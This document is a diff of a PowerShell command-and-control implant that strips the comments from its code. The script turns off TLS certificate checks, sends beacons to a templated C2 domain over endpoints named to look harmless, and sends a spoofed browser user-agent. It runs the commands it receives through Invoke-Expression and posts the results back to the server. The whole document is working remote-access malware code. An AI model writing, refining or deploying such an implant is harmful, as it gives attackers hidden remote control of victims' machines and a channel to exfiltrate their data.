@@ -1,25 +1,20 @@
-# Accept self-signed TLS certificates
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
-# Unique agent ID; must be defined *before* HEADERS
 $AGENT_ID        = [guid]::NewGuid().ToString()
 
-# C2 server configuration
 $C2_BASE       = "https://${c2_domain}"
 $GET_ENDPOINT  = "/api/v2/status"
 $POST_ENDPOINT = "/api/v2/users/update"
 
-# Now include Agent-ID in every request
 $HEADERS       = @{
     "Access-X-Control" = "000000011110000000"
     "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     "Agent-ID"         = $AGENT_ID
 }
 
-$SLEEP_INTERVAL  = 2   # seconds between beacons
+$SLEEP_INTERVAL  = 2   
 $INITIAL_CONNECT = $true
 
-# Grab primary IPv4 based on default route (fallback to any non-loopback)
 try {
     $defRoute = Get-NetRoute -DestinationPrefix "0.0.0.0/0" |
                 Where-Object { $_.NextHop -ne "0.0.0.0" } |
@@ -65,7 +60,6 @@ function Beacon {
 function Send-Output {
     param($output, $info)
     
-    # Clean up newlines and spaces
     $output = $output -replace '[\r\n]+', "`n"  # Remove excess newlines
     $output = $output.Trim()
 
@@ -74,7 +68,7 @@ function Send-Output {
         # Clean up the array output (list of files), making it line by line
         $output = $output -replace '^\[|\]$', ''  # Remove leading/trailing brackets
         $output = $output -replace '\', ''         # Remove any file path separators (optional)
-        $output = $output -replace ',\s*', "`n"   # Separate filenames with newlines
+        $output = $output -replace ',\s*', "`n"   
     }
 
     if ($info) {
@@ -90,7 +84,6 @@ function Send-Output {
         }
     }
     
-    # Send the clean output to C2 server
     Invoke-RestMethod -Uri "$C2_BASE$POST_ENDPOINT" `
                      -Headers $HEADERS `
                      -Method Post `
@@ -101,12 +94,9 @@ function Send-Output {
 function Execute-Command {
     param($command)
 
-    # Handle dir and ls commands to format the output cleanly
     if ($command -match "^dir" -or $command -match "^ls") {
-        # Use -Name to output just file names without the table formatting
         $result = Invoke-Expression "$command -Name"
         
-        # Ensure each filename is on a new line
         $result = $result -join "`n"
     } else {
         try {
